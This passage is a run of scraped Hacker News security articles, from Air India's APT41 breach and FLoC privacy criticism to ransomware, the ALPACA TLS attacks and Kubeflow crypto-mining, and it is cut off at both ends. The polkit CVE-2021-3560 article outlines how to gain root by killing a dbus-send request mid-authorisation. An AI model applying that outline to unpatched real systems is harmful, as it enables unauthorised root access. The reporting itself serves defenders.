rule rather than the exception for modern businesses, cloud security relies on continuously monitoring for risky SaaS misconfigurations. \nLearn more about how to prevent misconfiguration risks in your SaaS app estate\n\n\nFound this article interesting?

{'title': 'Chinese Hackers Believed to be Behind Second Cyberattack on Air India',
'text': 'Even as a massive data breach affecting Air India came to light the previous month, India’s flag carrier airline appears to have suffered a separate cyber assault that lasted for a period of at least two months and 26 days, new research has revealed, which attributed the incident with moderate confidence to a Chinese nation-state threat actor called APT41.\nGroup-IB dubbed the campaign “ColunmTK“ based on the names of command-and-control (C2) server domains that were used for facilitating communications with the compromised systems. \n“The potential ramifications of this incident for the entire airline industry and carriers that might yet discover traces of ColunmTK in their networks are significant,“ the Singapore-headquartered threat hunting company said.\nWhile Group-IB alluded that this may have been a supply chain attack targeting SITA, the Swiss aviation information technology company told The Hacker News that they are two different security incidents.\n“The airline confirmed vis-à-vis SITA on June 11, 2021 that the cyber attack on Air India [...] is not the same or in any way linked to the attack on SITA PSS,“ SITA told our publication over email.\n\nAlso known by other monikers such as Winnti Umbrella, Axiom and Barium, APT41 is a prolific Chinese-speaking nation-state advanced persistent threat known for its campaigns centered around information theft and espionage against healthcare, high-tech, and telecommunications sectors to establish and maintain strategic access for stealing intellectual property and committing financially motivated cybercrimes.\n“Their cyber crime intrusions are most apparent among video game industry targeting, including the manipulation of virtual currencies, and attempted deployment of ransomware,“ according to FireEye. “APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance.“\nOn May 21, Air India disclosed a data breach affecting 4.5 million of its customers over a period stretching nearly 10 years in the wake of a supply chain attack directed at its Passenger Service System (PSS) provider SITA earlier this February.\n\nThe breach involved personal data registered between Aug. 26, 2011, and Feb. 3, 2021, including details such as names, dates of birth, contact information, passport information, ticket information, Star Alliance, and Air India frequent flyer data, as well as credit card data.\nFireEye’s Mandiant, which is assisting SITA with the incident response efforts, has since determined that the attack was highly sophisticated and that the tactics, techniques, and procedures (TTPs) and compromise indicators point to a single entity, adding the “identity and motive of the perpetrator are not entirely conclusive.“\nLikely a New Attack Against Air India\nGroup-IB’s analysis has now revealed that at least since Feb. 23, an infected device inside Air India’s network (named “SITASERVER4“) communicated with a server hosting Cobalt Strike payloads dating all the way back to Dec. 11, 2020.\nFollowing this initial compromise, the attackers are said to have established persistence and obtained passwords in order to pivot laterally to the broader network with the goal of gathering information inside the local network.\nNo fewer than 20 devices were infected during the course of lateral movement, the company said. “The attackers exfiltrated NTLM hashes and plain-text passwords from local workstations using hashdump and mimikatz,“ Group-IB Threat Intelligence Analyst, Nikita Rostovcev, said. “The attackers tried to escalate local privileges with the help of BadPotato malware.“\n\nIn all, the adversary extracted 23.33 MB of data from five devices named SITASERVER4, AILCCUALHSV001, AILDELCCPOSCE01, AILDELCCPDB01, and WEBSERVER3, with the attackers taking 24 hours and 5 minutes to spread Cobalt Strike beacons to other devices in the airline’s network. The initial entry point for the attack remains unknown as yet.\nConnections to Barium are grounded on the basis of overlaps between the C2 servers found in the attack infrastructure with those used in earlier attacks and tactics employed by the threat actor to park their domains once their operations are over. Group-IB also said it discovered a file named “Install.bat“ that bore similarities to payloads deployed in a 2020 global intrusion campaign.When reached for a response, Group-IB CTO Dmitry Volkov told The Hacker News that “Despite the fact that the initial compromise vector remains unknown, Group-IB treats [the] SITA incident and Air India breach as interrelated.““This assumption is built on the fact that it was a server in Air India’s network that, Group-IB assumes, might have established [a] connection with SITA’s network that was breached first. According to Group-IB’s data, SITASERVER4 was the first host to have been infected within Air India’s network. This has also been confirmed by Air India,“ Volkov added.\nHowever, it’s worth noting that SITASERVER4 was neither owned or managed by SITA. Speaking on background, SITA noted that the server in question had been previously used to host software offered by the company to Air India and that the specific software was removed from the server in 2019.\nThe aviation IT provider also clarified that none of the methods that were used to target Air India since February 23 were put to use in the attacks on SITA PSS, adding the adversary was removed from its network weeks prior to the start of the malicious activity directed against the airline, implying that the two incidents had no bearing on one another.\n\n\nFound this article interesting?

{'title': 'Mozilla Says Google’s New Ad Tech—FLoC—Doesn’t Protect User Privacy',
'text': 'Google’s upcoming plans to replace third-party cookies with a less invasive ad targeted mechanism have a number of issues that could defeat its privacy objectives and allow for significant linkability of user behavior, possibly even identifying individual users.\n“FLoC is premised on a compelling idea: enable ad targeting without exposing users to risk,“ said Eric Rescorla, author of TLS standard and chief technology officer of Mozilla. “But the current design has a number of privacy properties that could create significant risks if it were to be widely deployed in its current form.“\nShort for Federated Learning of Cohorts, FLoC is part of Google’s fledgling Privacy Sandbox initiative that aims to develop alternate solutions to satisfy cross-site use cases without resorting to third-party cookies or other opaque tracking mechanisms.\nEssentially, FLoC allows marketers to guess users’ interests without having to uniquely identify them, thereby eliminating the privacy implications associated with tailored advertising, which currently relies on techniques such as tracking cookies and device fingerprinting that expose users’ browsing history across sites to advertisers or ad platforms.\n\nFLoC sidesteps the cookie with a new “cohort“ identifier wherein users are bucketed into clusters based on similar browsing behaviors. Advertisers can aggregate this information to build a list of websites that all the users in a cohort visit as opposed to using the history of visits made by a specific user, and then target ads based on the cohort interest.The idea, in a nutshell, is to leverage on-device machine learning and “hide“ individuals in the crowd by keeping users’ web history private on the Chrome browser.\n“With FLoC, individual profiles are a potential source of additional information about the properties of the FLoC as a whole,“ Mozilla said. “For instance, information from individual profiles can be generalized to inform decisions about the FLoC cohort as a whole.“\nAdditionally, the cohort ID assigned to users is recalculated weekly on the device, which is meant to reflect their evolving interests over time as well as prevent its use as a persistent identifier to track users. Google is currently running an origin trial for FLoC in its Chrome browser, with plans to roll it out in place of third-party cookies at some point next year.\n\nDespite its promise to offer a greater degree of anonymity, Google’s proposals have been met with stiff resistance from regulators, privacy advocates, publishers, and every major browser that uses the open-source Chromium project, including Brave, Vivaldi, Opera, and Microsoft Edge. “The worst aspect of FLoC is that it materially harms user privacy, under the guise of being privacy-friendly,“ Brave said in April.\nThe “privacy-safe ad targeting“ method has also come under the scanner from the Electronic Frontier Foundation, which called FLoC a “terrible idea“ that can lower the barrier to companies gathering information about individuals just based on the cohort IDs assigned to them. “If a tracker starts with your FLoC cohort, it only has to distinguish your browser from a few thousand others (rather than a few hundred million),“ the EFF said.\n\nIndeed, according to a recent report from Digiday, “companies are starting to combine FLoC IDs with existing identifiable profile information, linking unique insights about people’s digital travels to what they already know about them, even before third-party cookie tracking could have revealed it,“ effectively neutralizing the privacy benefits of the system.\nMozilla’s analysis of FLoC backs up this argument. Given that only a few thousand users share a specific cohort ID, trackers that are in possession of additional information can narrow down the set of users very quickly by coupling the identifiers with fingerprinting data and even leverage the periodically recomputed cohort IDs as a leakage point to distinguish individual users from one week to the other.\n\n“Before the pandemic and some time back, I attended a Mew concert, a Ghost concert, Disney on Ice, and a Def Leppard concert. At each of those events I was part of a large crowd. But I bet you I was the only one to attend all four,“ said John Wilander, WebKit privacy and security engineer, earlier this April, pointing out how cohort IDs can be collected over time to create cross-site tracking IDs.\nWhat’s more, because FLoC IDs are the same across all websites for all users in a cohort, the identifiers undermine restrictive cookie policies and leak more information than necessary by turning into a shared key to which trackers can map data from other external sources, the researchers detailed.\nGoogle has put in place mechanisms to address these undesirable privacy shortcomings, including making FLoC opt-in for websites and suppressing cohorts that it believes are closely correlated with “sensitive“ topics. But Mozilla said “these countermeasures rely on the ability of the browser manufacturer to determine which FLoC inputs and outputs are sensitive, which itself depends on their ability to analyze user browsing history as revealed by FLoC,“ in turn circumventing the privacy protections.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nAs potential avenues for improvement, the researchers suggest creating FLoC IDs per domain, partitioning the FLoC ID by the first-party site, and falsely suppressing the cohort ID belonging to users without sensitive browsing histories so as to protect users who cannot report a cohort ID. It’s worth noting that the FLoC API returns an empty string when a cohort is marked as sensitive.\n“When considered as coexisting with existing state-based tracking mechanisms, FLoC has the potential to significantly increase the power of cross-site tracking,“ the researchers concluded. “In particular, in cases where cross-site tracking is prevented by partitioned storage, the longitudinal pattern of FLoC IDs might allow an observer to re-synchronize visits by the same user across multiple sites, thus partially obviating the value of these defenses.“\nUltimately, the greatest threat to FLoC may be Google itself, which is not only the biggest search engine, but also the developer behind the world’s most used web browser and the owner of the world’s largest advertising platform, landing it between a rock and a hard place where any attempt to rewrite the rules of the web could be perceived as an attempt to bolster its own dominance in the sector.\nSuch is its scope and outsized impact, Privacy Sandbox is attracting plenty of regulatory scrutiny. The U.K.’s Competition and Markets Authority (CMA) earlier today announced that it’s taking up a “role in the design and development of Google’s Privacy Sandbox proposals to ensure they do not distort competition.“\n\n\nFound this article interesting?

{'title': 'Live Cybersecurity Webinar — Deconstructing Cobalt Strike',
'text': 'Organizations’ cybersecurity capabilities have improved over the past decade, mostly out of necessity. As their defenses get better, so do the methods, tactics, and techniques malicious actors devise to penetrate their environments.\nInstead of the standard virus or trojan, attackers today will deploy a variety of tools and methods to infiltrate an organization’s environment and attack it from the inside.\nIn an interesting twist of fate, one of the tools organizations have used to audit and improve their defenses has also become a popular tool attackers use to infiltrate. Cobalt Strike is an Adversary Simulation and Red Team Operations tool that allows organizations to simulate advanced attacks and test their security stacks in a close-to-real-world simulation.\nA new research webinar from XDR provider Cynet (register here) offers a better look at Cobalt Strike. The webinar, led by Cyber Operations Analyst for the Cynet MDR Team Yuval Fischer, will take a deep dive into the threat.\nAs a simulation, it is impressive in its capabilities, and it’s prized for being highly customizable. All these traits have also made it an effective attack tool for actual malicious actors. Cobalt Strike is a C2 server that offers highly sophisticated and easy-to-use features, and the past year has seen a huge jump in the number of recorded Cobalt Strike attacks in the wild. In fact, a study by Recorded Future’s Insikt Group found that Cobalt Strike was the most commonly deployed C2 server in malicious attacks.\nOne of the biggest reasons Cobalt Strike has become so widespread is its various capabilities, which include: \nReconnaissance on client-side software usage, as well as version vulnerabilitiesA variety of attack packages that include social engineering, trojans, and masquerading toolsCollaboration tools that let group host share data with a group of attackersPost exploitation tools to deploy scripts, log keystrokes and execute other payloads Covert communication tools that let teams modify network indicators on the go Browser pivoting to circumvent \nAdditionally, Cobalt Strike uses Beacon, a powerful delivery mechanism that can be transmitted over various protocols, and hide by modifying its network signature, emulating other types of malware, and even masquerading as legitimate traffic.\nEven so, Cobalt Strike is not undetectable. However, it requires a variety of techniques to detect it properly. This includes things like examining default TLS certificates, searching for open ports, And performing HTTP requests to find non-existent pages. Even then, most organizations require advanced tools actually to defend against Cobalt Strike..\nThe new research webinar dives deeper into Cobalt Strike. It does so by exploring a few areas:\nThe basics of Cobalt Strike as an attack tool. This includes breaking down how it works, what makes it so effective, and how malicious actors have modified, customized, and upgraded it to become more dangerous. Instances in the wild. More than any theoretical research, live case studies provide the greatest insights into how Cobalt Strike operates and succeeds in penetrating organizations’ defenses. A deeper dive into Cobalt Strike’s capabilities and deployment tools. The webinar will also dive deeper into Cobalt Strike’s different functionalities, how they’re deployed, and what they actually do. How organizations can defend against Cobalt Strike. Finally, the webinar will touch on the ways organizations can detect and defend against Cobalt Strike, and how they can mitigate the impact of a successful initial infiltration.\nYou can register here for the webinar. \n\n\nFound this article interesting?

{'title': '7-Year-Old Polkit Flaw Lets Unprivileged Linux Users Gain Root Access',
'text': 'A seven-year-old privilege escalation vulnerability discovered in the polkit system service could be exploited by a malicious unprivileged local attacker to bypass authorization and escalate permissions to the root user.\nTracked as CVE-2021-3560 (CVSS score: 7.8), the flaw affects polkit versions between 0.113 and 0.118 and was discovered by GitHub security researcher Kevin Backhouse, who said the issue was introduced in a code commit made on Nov. 9, 2013. Red Hat’s Cedric Buissart noted that Debian-based distributions, based on polkit 0.105, are also vulnerable.\n\nPolkit (née PolicyKit) is a toolkit for defining and handling authorizations in Linux distributions, and is used for allowing unprivileged processes to communicate with privileged processes.\n“When a requesting process disconnects from dbus-daemon just before the call to polkit_system_bus_name_get_creds_sync starts, the process cannot get a unique uid and pid of the process and it cannot verify the privileges of the requesting process,“ Red Hat said in an advisory. “The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.“\nRHEL 8, Fedora 21 (or later), Debian “Bullseye,“ and Ubuntu 20.04 are some of the popular Linux distributions impacted by the polkit vulnerability. The issue has been mitigated in version 0.119, which was released on June 3.\n\n“The vulnerability is surprisingly easy to exploit. All it takes is a few commands in the terminal using only standard tools like bash, kill, and dbus-send,“ said Backhouse in a write-up published yesterday, adding the flaw is triggered by sending a dbus-send command (say, to create a new user) but terminating the process while polkit is still in the middle of processing the request.\n\n“dbus-send“ is a Linux inter-process communication (IPC) mechanism that’s used to send a message to D-Bus message bus, allowing communication between multiple processes running concurrently on the same machine. Polkit’s policy authority daemon is implemented as a service connected to the system bus to authenticate credentials securely.\nIn killing the command, it causes an authentication bypass because polkit mishandles the terminated message and treats the request as though it came from a process with root privileges (UID 0), thereby immediately authorizing the request.\n“To trigger the vulnerable codepath, you have to disconnect at just the right moment,“ Backhouse said. “And because there are multiple processes involved, the timing of that ’right moment’ varies from one run to the next. That’s why it usually takes a few tries for the exploit to succeed. I’d guess it’s also the reason why the bug wasn’t previously discovered.“\nUsers are encouraged to update their Linux installations as soon as possible to remediate any potential risk arising out of the flaw.\n\n\nFound this article interesting?

{'title': 'New Cyber Espionage Group Targeting Ministries of Foreign Affairs',
'text': 'Cybersecurity researchers on Thursday took the wraps off a new cyber espionage group that has been behind a series of targeted attacks against diplomatic entities and telecommunication companies in Africa and the Middle East since at least 2017.\nDubbed “BackdoorDiplomacy,“ the campaign involves targeting weak points in internet-exposed devices such as web servers to perform a panoply of cyber hacking activities, including laterally moving across the network to deploy a custom implant called Turian that’s capable of exfiltrating sensitive data stored in removable media.\n\n“BackdoorDiplomacy shares tactics, techniques, and procedures with other Asia-based groups. Turian likely represents a next stage evolution of Quarian, the backdoor last observed in use in 2013 against diplomatic targets in Syria and the U.S,“ said Jean-Ian Boutin, head of threat research at Slovak cybersecurity firm ESET.\n\nEngineered to target both Windows and Linux operating systems, the cross-platform group singles out management interfaces for networking equipment and servers with internet-exposed ports, likely exploiting unpatched vulnerabilities to deploy the China Chopper web shell for initial access, using it to conduct reconnaissance and install the backdoor.\n\nTargeted systems include F5 BIG-IP devices (CVE-2020-5902), Microsoft Exchange servers, and Plesk web hosting control panels. Victims have been identified in the Ministries of Foreign Affairs of multiple African countries, as well as in Europe, the Middle East, and Asia. Additionally, telecom providers in Africa and at least one Middle Eastern charity have also been hit.\n\n“In each case, operators employed similar tactics, techniques, and procedures (TTPs), but modified the tools used, even within close geographic regions, likely to make tracking the group more difficult,“ the researchers said. BackdoorDiplomacy is also believed to overlap with previously reported campaigns operated by a Chinese-speaking group Kaspersky tracks as “CloudComputating.“\nBesides its features to gather system information, take screenshots, and carry out file operations, ESET researchers said Turian’s network encryption protocol is nearly identical to that employed by WhiteBird, a C++ backdoor operated by an Asia-based threat actor named Calypso, that was installed within diplomatic organizations in Kazakhstan and Kyrgyzstan, and during the same timeframe as BackdoorDiplomacy.\n\n\nFound this article interesting?

The cyber crackdown, which involved the joint efforts of the U.S., Germany, the Netherlands, and Romania, also commandeered a set of servers hosting its infrastructure as well as the multiple domains the group operated.\n\nOperational since 2012, Slilpp was a marketplace for allegedly stolen online account login credentials belonging to 1,400 companies worldwide, offering for sale more than 80 million plundered usernames and passwords for bank accounts, online payment accounts, mobile phone accounts, retailer accounts, and other online accounts, which were abused to conduct unauthorized transactions, such as wire transfers, from the related accounts.\n\n\nBased on existing victim reports, the DoJ said the pilfered login credentials sold over Slilpp have been used to siphon no less than $200 million in the U.S.\n“The Slilpp marketplace allegedly caused hundreds of millions of dollars in losses to victims worldwide, including by enabling buyers to steal the identities of American victims,“ said Acting Assistant Attorney General Nicholas L. McQuaid of the DoJ’s Criminal Division. “The department will not tolerate an underground economy for stolen identities, and we will continue to collaborate with our law enforcement partners worldwide to disrupt criminal marketplaces wherever they are located.“\n\nThe development comes amid a flurry of law enforcement actions against cybercrime groups in recent months, including that of TrickBot, Emotet, and ANoM.

{'title': 'Emerging Ransomware Targets Dozens of Businesses Worldwide',
'text': 'An emerging ransomware strain in the threat landscape claims to have breached 30 organizations in just four months since it went operational by riding on the coattails of a notorious ransomware syndicate.\nFirst observed in February 2021, “Prometheus“ is an offshoot of another well-known ransomware variant called Thanos, which was previously deployed against state-run organizations in the Middle East and North Africa last year.\nThe affected entities are believed to be government, financial services, manufacturing, logistics, consulting, agriculture, healthcare services, insurance agencies, energy and law firms in the U.S., U.K., and a dozen more countries in Asia, Europe, the Middle East, and South America, according to new research published by Palo Alto Networks’ Unit 42 threat intelligence team.\n\nLike other ransomware gangs, Prometheus takes advantage of double-extortion tactics and hosts a dark web leak site, where it names and shames new victims and makes stolen data available for purchase, while managing to inject a veneer of professionalism into its criminal activities.\n“Prometheus runs like a professional enterprise,“ Doel Santos, Unit 42 threat intelligence analyst, said. “It refers to its victims as ’customers,’ communicates with them using a customer service ticketing system that warns them when payment deadlines are approaching and even uses a clock to count down the hours, minutes and seconds to a payment deadline.“\nHowever, only four of those 30 affected organizations opted to pay ransoms to date, the cybersecurity firm’s analysis revealed, including a Peruvian agricultural company, a Brazilian healthcare services provider, and two transportation and logistics organizations in Austria and Singapore.\n\nIt’s worth noting that despite Prometheus’ strong links to Thanos, the gang professes to be a “group of REvil,“ one of the most prolific and infamous ransomware-as-a-service (RaaS) cartels in recent years, which the researchers speculate could be an attempt to deflect attention from Thanos or a deliberate ploy to trick victims into paying up by piggybacking on an established operation.\nWhile the ransomware’s intrusion route remains unclear as yet, it’s expected that the group purchased access to target networks or staged spear-phishing and brute-force attacks to gain initial access. Following a successful compromise, the Prometheus modus operandi involves terminating backup and security software-related processes on the system to lock the files behind encryption barriers.\n\n“The Prometheus ransomware operators generate a unique payload per victim, which is used for their negotiation site to recover files,“ Santos said, adding the ransom demand ranges anywhere between $6,000 and $100,000 depending on the victim organization, a price that gets doubled if the victim fails to pay up within the designated time period.\n\nThe development also comes as cybercrime groups are increasingly targeting SonicWall devices to breach corporate networks and deploy ransomware. A report published by CrowdStrike this week found evidence of remote access vulnerabilities (CVE-2019-7481) in SonicWall SRA 4600 VPN appliances being exploited as an initial access vector for ransomware attacks targeting organizations worldwide.\n\n\nFound this article interesting?

{'title': 'Using Breached Password Detection Services to Prevent Cyberattack',
'text': 'Bolstering password policies in your organization is an important part of a robust cybersecurity strategy. Cybercriminals are using compromised accounts as one of their favorite tactics to infiltrate business-critical environments; as we’ve seen in recent news, these attacks can be dangerous and financially impactful.\nUnfortunately, account compromise is a very successful attack method and requires much less effort than other attack vectors.\nOne of the essential types of password protection recommended by noted cybersecurity standards is breached password detection. Hackers often use known breached password lists in credential stuffing or password spraying attacks.\nHere are some critical criteria to consider when your sysadmins are evaluating breached password protection solutions. \nBreached password recommendations\nIn the last few years, password security recommendations have evolved past the traditional recommendations regarding password security. \nBusinesses have used Microsoft Active Directory for years to implement password policies in the organization. Standard Active Directory password policies include minimal password configuration settings. \nBelow is an example of the settings offered with a conventional Active Directory Password Policy: \nEnforce password historyMaximum password ageMinimum password ageMinimum password lengthMinimum password length auditPassword must meet complexity requirementsStore password using reversible encryption\n\nBy default, Active Directory Password Policies do not include a solution to implement breached password protection.\nActive Directory Password Policy settings\nWhy is it important for businesses to start thinking about breached password protection? Let’s look at best practice recommendations from leading authorities in cybersecurity guidance. \nNew password policy recommendations\nAs mentioned, traditional password policies created using Active Directory are limited in features and capabilities. These allow creating basic password policies with standard length, complexity, age, and other requirements. However, there is no way to use native functionality to implement breached password protection. \nWhile there is a means for implementing a password filter .dll in Active Directory to provision password dictionary protection, this is a manual process relying on the development of custom password filter .dll files. \nNew password policy guidance from leading cybersecurity authorities such as the National Institute of Standards and Technology (NIST) recommend breached password protection. The NIST Special Publication 800-63B SP 800-63B Section 5.1.1.2 paragraph 9 states: \n“Verifiers SHOULD NOT impose other composition rules (e.g., requiring mixtures of different character types or prohibiting consecutively repeated characters) for memorized secrets. Verifiers SHOULD NOT require memorized secrets to be changed arbitrarily (e.g., periodically). However, verifiers SHALL force a change if there is evidence of compromise of the authenticator.“\nBasically, NIST’s guidance recommends that organizations should force a password change if there is evidence of a breach. For businesses to have proof of a password breach, they must have a way to monitor the password landscape for breached passwords. In addition to monitoring for passwords to become breached, as users choose new passwords, the new password choices need to be checked. \nEvaluating breached password detection services\nBreached password detection is a recommended best practice for an additional layer of cyberattack prevention. Consider the following functions as must-haves to pay close attention to when choosing a solution:\nEase of deploymentProactive monitoringProactive password changesBreached password database sizeIntegration with current Active Directory password policiesEase of deployment\nAn essential consideration businesses need to make when choosing a third-party breached password solution is deployment ease. Look for solutions that are easily deployed using existing Active Directory infrastructure. Solutions that are difficult to deploy will likely lead to configuration issues and challenges with implementation and time to value. Look for solutions that make use of existing Active Directory infrastructure along with Group Policy that allows quickly making use of existing policies and infrastructure. \n1 — Proactive monitoring\nOne of the essential requirements for breached password protection is proactive monitoring. Organizations need a solution that checks a password during the password set operation and proactively monitors the password landscape to find passwords that may become breached. This functionality helps to ensure passwords that may not be breached during creation, but become breached later, are correctly identified and can be remediated.\n2 — Proactive password changes \nDovetailing into the proactive monitoring of breached passwords in the environment, organizations need to look for a breached password protection solution that proactively requires end-users to change their password if these become breached. This feature helps ensure any passwords that become breached in the environment are remediated as quickly as possible.\n3 — Breached password database size\nKeep in mind that all breached password protection services are not equal in the number of breached passwords checked. Breached password databases may vary between different services. The more extensive the breached password database, the better for protecting against breached passwords. If the quantity of breached passwords isn’t transparently communicated, ask the vendor directly how many are included in their backend lists. \n4 — Integration with current Active Directory password policies\nSpecops Breached Password Protection\nLook for a breached password protection solution that can integrate with current Active Directory password policies. It means you can leave GPO assignments in place that assign various password policies to specific users and will help to prevent “reinventing the wheel.“ \nSpecops Breached Password Protection\nThe Specops Password Policy solution allows organizations to have powerful breached password protection as part of the environment’s password security. Features include all the top requirements, like:\nProactive breached password monitoring and password change enforcementEasily to deploy and integrates with existing Active Directory GPO-based password policiesDownloadable breached password database or API-based protectionManaged database of over 2-billion passwords and growingWith the API-based approach, you get real-time breached password protection for your organization’s passwords\nUsing Specops Password Policy with Breached Password Protection, you can easily rollout breached password protection using GPO-based Active Directory Password Policies that are already in place. \nTo delve into the Specops Password Policy with Breached Password Protection, start a free trial anytime.\n \n\n\nFound this article interesting?

{'title': 'Beef Supplier JBS Paid Hackers $11 Million Ransom After Cyberattack',
'text': 'Meat processing company JBS on Wednesday confirmed it paid extortionists $11 million in bitcoins to regain access to its systems following a destructive ransomware attack late last month.\n“In consultation with internal IT professionals and third-party cybersecurity experts, the company made the decision to mitigate any unforeseen issues related to the attack and ensure no data was exfiltrated,“ JBS USA said in a statement, with CEO Andre Nogueira adding the firm made the “very difficult decision“ to prevent any potential risk for its customers.\nStating that third-party forensic investigations into the incident are still ongoing, the company noted that no company, customer, or employee data was compromised as a consequence of the breach. The FBI officially discourages victims from paying ransoms because doing so can establish a profitable criminal marketplace.\nJBS, the world’s largest meat company by sales, on May 30 disclosed it fell prey to an “organized cybersecurity attack“ targeting its IT network, temporarily knocking out its operations in Australia, Canada, and the U.S. The intrusion was attributed to REvil (aka Sodinokibi), a prolific Russia-linked cybercrime group that has emerged as one of the top-earning ransomware cartels by revenue.\n\nRun as a ransomware-as-a-service business, REvil was also one of the early adopters of the so-called “double extortion“ model that has since been emulated by other groups to exert further pressure on the victim company to meet ransom demands within the designated timeframe and maximize their chances of making a profit.\nThe technique involves stealing sensitive data prior to encrypting them, thus opening the door to new threats wherein refusal to engage can result in the stolen data being published on its website on the dark web.\nREvil and its affiliates accounted for about 4.6% of attacks on the public and private sectors in the first quarter of 2021, according to statistics published by Emsisoft last month, making it the fifth most commonly reported ransomware strain after STOP (51.4%), Phobos (6.6%), Dharma (5.1%), and Makop (4.7%).\nThe syndicates are known to launder their financial proceeds through Bitcoin mixing services so as to obscure the trail, which is then sent to both legitimate and high-risk cryptocurrency exchange portals to convert the bitcoins into fiat, real-world currency.\nThe attack on JBS comes amid a recent spate of ransomware incursions in which companies are hit with demands for multimillion-dollar payments in exchange for a key to unlock the systems. Last month, Colonial Pipeline shelled out a ransom amount of approximately 75 bitcoins ($4.4 million as of May 8) to restore services, although the U.S. government earlier this week managed to recoup most of the money by tracking the bitcoin trails.\n\n“Being extorted by criminals is not a position any company wants to be in,“ Colonial Pipeline CEO Joseph Blount said in a hearing before the U.S. Senate Committee on June 8. “As I have stated publicly, I made the decision that Colonial Pipeline would pay the ransom to have every tool available to us to swiftly get the pipeline back up and running. It was one of the toughest decisions I have had to make in my life.“\nIn a similar development, U.S. insurance firm CNA is said to have allegedly paid off $40 million to the attackers to recover access to its systems in what’s believed to be one of the most expensive ransoms settled to date. In a statement shared on May 12, the company said it had “no evidence to indicate that external customers were potentially at risk of infection due to the incident.“\nThe incessant attacks on critical infrastructure and their impact to supply chains have prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to publish a fact sheet detailing the rising threat of ransomware to operational technology assets and control systems and help organizations build effective resilience.\n\n\nFound this article interesting?

{'title': 'New TLS Attack Lets Attackers Launch Cross-Protocol Attacks Against Secure Sites',
'text': 'Researchers have disclosed a new type of attack that exploits misconfigurations in transport layer security (TLS) servers to redirect HTTPS traffic from a victim’s web browser to a different TLS service endpoint located on another IP address to steal sensitive information.\nThe attacks have been dubbed ALPACA, short for “Application Layer Protocol Confusion - Analyzing and mitigating Cracks in tls Authentication,“ by a group of academics from Ruhr University Bochum, Münster University of Applied Sciences, and Paderborn University.\n“Attackers can redirect traffic from one subdomain to another, resulting in a valid TLS session,“ the study said. “This breaks the authentication of TLS and cross-protocol attacks may be possible where the behavior of one protocol service may compromise the other at the application layer.“\nTLS is a cryptographic protocol underpinning several application layer protocols like HTTPS, SMTP, IMAP, POP3, and FTP to secure communications over a network with the goal of adding a layer of authentication and preserving integrity of exchanged data while in transit.\n\nALPACA attacks are possible because TLS does not bind a TCP connection to the intended application layer protocol, the researchers elaborated. The failure of TLS to protect the integrity of the TCP connection could therefore be abused to “redirect TLS traffic for the intended TLS service endpoint and protocol to another, substitute TLS service endpoint and protocol.“\nGiven a client (i.e., web browser) and two application servers (i.e., the intended and substitute), the goal is to trick the substitute server into accepting application data from the client, or vice versa. Since the client uses a specific protocol to open a secure channel with the intended server (say, HTTPS) while the substitute server employs a different application layer protocol (say, FTP) and runs on a separate TCP endpoint, the mix-up culminates in what’s called a cross-protocol attack.\n\nAt least three hypothetical cross-protocol attack scenarios have been uncovered, which can be leveraged by an adversary to circumvent TLS protections and target FTP and email servers. The attacks, however, hinge on the prerequisite that the perpetrator can intercept and divert the victim’s traffic at the TCP/IP layer.\nPut simply, the attacks take the form of a man-in-the-middle (MitM) scheme wherein the malicious actor entices a victim into opening a website under their control to trigger a cross-origin HTTPS request with a specially crafted FTP payload. This request is then redirected to an FTP server that uses a certificate that’s compatible with that of the website, thus spawning a valid TLS sessionn.\nConsequently, the misconfiguration in TLS services can be exploited to exfiltrate authentication cookies or other private data to the FTP server (Upload Attack), retrieve a malicious JavaScript payload from the FTP server in a stored XSS attack (Download Attack), or even execute a reflected XSS in the context of the victim website (Reflection Attack).\n\nAll TLS servers that have compatible certificates with other TLS services are expected to be affected. In an experimental setup, the researchers found that at least 1.4 million web servers were vulnerable to cross-protocol attacks, with 114,197 of the servers considered prone to attacks using an exploitable SMTP, IMAP, POP3, or FTP server with a trusted and compatible certificate.\nTo counter cross-protocol attacks, the researchers propose utilizing Application Layer Protocol Negotiation (ALPN) and Server Name Indication (SNI) extensions to TLS that can be used by a client to let the server know about the intended protocol to be used over a secure connection and the hostname it’s attempting to connect to at the start of the handshake process.\nThe findings are expected to be presented at Black Hat USA 2021 and at USENIX Security Symposium 2021. Additional artifacts relevant to the ALPACA attack can be accessed via GitHub here.\n\n\nFound this article interesting?

{'title': 'Crypto-Mining Attacks Targeting Kubernetes Clusters via Kubeflow Instances',
'text': 'Cybersecurity researchers on Tuesday disclosed a new large-scale campaign targeting Kubeflow deployments to run malicious cryptocurrency mining containers.\nThe campaign involved deploying TensorFlow pods on Kubernetes clusters, with the pods running legitimate TensorFlow images from the official Docker Hub account. However, the container images were configured to execute rogue commands that mine cryptocurrencies. Microsoft said the deployments witnessed an uptick towards the end of May.\n\nKubeflow is an open-source machine learning platform designed to deploy machine learning workflows on Kubernetes, an orchestration service used for managing and scaling containerized workloads across a cluster of machines.\nThe deployment, in itself, was achieved by taking advantage of Kubeflow, which exposes its UI functionality via a dashboard that is deployed in the cluster. In the attack observed by Microsoft, the adversaries used the centralized dashboard as an ingress point to create a pipeline to run TensorFlow images that perform cryptocurrency mining tasks.\n“The burst of deployments on the various clusters was simultaneous. This indicates that the attackers scanned those clusters in advance and maintained a list of potential targets, which were later attacked on the same time,“ Microsoft’s Senior Security Research Engineer Yossi Weizman said in a report.\nThe intrusions also echo similar attacks observed by Microsoft Azure Security Center last April that abused Internet-exposed Kubeflow dashboards to deploy a backdoor container for a crypto-mining operation. Weizman told The Hacker News that there’s no evidence that the two campaigns were undertaken by the same threat actors.\n\nThe ongoing attacks are said to have used two different TensorFlow images — tagged “latest“ and “latest-gpu“ — to run the malicious code. Utilizing legitimate TensorFlow images is also a clever design to avoid detection in that TensorFlow containers are prevalent in machine learning-based workloads.\nFurthermore, Microsoft said the attackers are able to take advantage of the images to run GPU tasks using CUDA, thereby enabling the adversary to “maximize the mining gains from the host.“\n“As part of the attacking flow, the attackers also deployed [a] reconnaissance container that queries information about the environment such as GPU and CPU information, as preparation for the mining activity,“ Weizman said. “This also ran from a TensorFlow container.“\nThe development comes days after Palo Alto Networks’ Unit 42 threat intelligence team disclosed a brand new form of malware called Siloscope designed to compromise Kubernetes clusters through Windows containers.\n\nUsers running Kubeflow are recommended to ensure that the centralized dashboard isn’t insecurely exposed to the Internet, and if deemed 